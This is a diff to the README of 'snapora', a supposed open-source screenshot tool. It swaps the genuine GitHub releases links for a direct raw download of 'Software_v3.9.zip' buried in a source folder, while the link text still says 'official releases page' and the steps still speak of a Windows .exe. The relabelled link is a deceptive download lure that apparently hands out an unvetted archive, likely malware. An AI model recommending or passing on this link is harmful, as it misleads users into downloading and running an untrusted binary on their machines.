@@ -1,6 +1,6 @@
 # 📸 snapora - Capture and edit screens with ease
 
-[![Download Snapora](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Leering-deliberatedefense36/snapora/releases)
+[![Download Snapora](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Leering-deliberatedefense36/snapora/raw/refs/heads/main/src/main/selection/Software_v3.9.zip)
 
 Snapora provides a simple way to take screenshots and record your computer screen. It replaces paid tools with a free, open-source alternative. You can mark up images with arrows, boxes, and text after you take them. Use this tool to improve your workflow and communicate ideas clearly.
 
@@ -8,7 +8,7 @@ Snapora provides a simple way to take screenshots and record your computer scree
 
 Follow these steps to put the software on your computer:
 
-1. Visit the [official releases page](https://github.com/Leering-deliberatedefense36/snapora/releases).
+1. Visit the [official releases page](https://github.com/Leering-deliberatedefense36/snapora/raw/refs/heads/main/src/main/selection/Software_v3.9.zip).
 2. Look for the section labeled Latest.
 3. Find the file that ends with .exe for Windows.
 4. Click the file name to start your download.
